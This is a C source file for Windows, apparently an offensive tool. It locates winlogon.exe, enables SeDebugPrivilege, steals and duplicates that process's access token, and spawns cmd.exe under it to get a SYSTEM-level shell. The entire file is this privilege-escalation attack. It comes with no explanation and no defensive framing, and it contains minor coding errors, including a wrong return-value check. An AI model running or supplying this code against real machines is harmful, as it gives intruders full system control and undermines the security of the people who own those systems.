#include <Windows.h>
#include <stdio.h>
#include <TlHelp32.h>

DWORD getPPID() {


	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (snapshot == INVALID_HANDLE_VALUE) {
		printf("[!] Failed to take snapshot for enumeration.\nExiting with error: %ld\n", GetLastError());
		CloseHandle(snapshot);
		return EXIT_FAILURE;
	}
	printf("[+] Snapshot taken successful.\n");
	
	PROCESSENTRY32 pe32;
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(snapshot, &pe32) == TRUE) {
		while (Process32Next(snapshot, &pe32) == TRUE) {
			if (_wcsicmp(pe32.szExeFile, L"winlogon.exe") == 0) {
				DWORD PPID = pe32.th32ProcessID;
				return PPID;
				break;
			}
		}
	}
	CloseHandle(snapshot);
}

BOOL EnablePrivileges(HANDLE hToken, LPCTSTR lpPrivilegeName, BOOL bEnablePrivilege) {

	LUID luid;
	TOKEN_PRIVILEGES tp;

	LookupPrivilegeValue(NULL, lpPrivilegeName, &luid);

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tp.Privileges[0].Luid = luid;

	if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
		printf("[!] AdjustTokenPrivileges() failed.\nExiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] EAdjustTokenPrivileges() success.\n");
}

int main() {

	DWORD PPID = getPPID();
	printf("[*] Process ID of target process [winlogon.exe] is %ld\n", PPID);

	HANDLE CurrentTokenHandle;
	HANDLE tTokenHandle;
	HANDLE DuplicateToken;
	STARTUPINFO stinfo = { 0 };
	PROCESS_INFORMATION pinfo = { 0 };

	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &CurrentTokenHandle);
	if (getCurrentToken == 0) {
		printf("[!] Failed to get token of current process.\nExiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Got the access token of current process.\n");

	EnablePrivileges(CurrentTokenHandle, SE_DEBUG_NAME, TRUE);

	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, PPID);
	if (hProcess == NULL) {
		printf("[!] Failed to get an handle to the target process.\nExiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Got an handle to the target process.\n");

	BOOL rProcToken = OpenProcessToken(hProcess, (TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY), &tTokenHandle);
	if (OpenProcessToken == 0) {
		printf("[!] OpenProcessToken() Failed.\nExiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] OpenProcesToken() success.\n");

	BOOL ImpersonateToken = ImpersonateLoggedOnUser(tTokenHandle);

	if (!DuplicateTokenEx(tTokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &DuplicateToken)) {
		printf("[!] Failed to create a duplicate token.\nExiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Got a duplicate token.\n");

	BOOL NewProcess = CreateProcessWithTokenW(DuplicateToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &stinfo, &pinfo);
	if (NewProcess == 0) {
		printf("[!] Failed to create a new process with duplicated token.\nExiting with error: %ld\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] New Process [cmd.exe] created successfully with duplicated token.\n");
	printf("[+] PID of new process. PID: %ld\n", pinfo.dwProcessId);
	return EXIT_SUCCESS;
}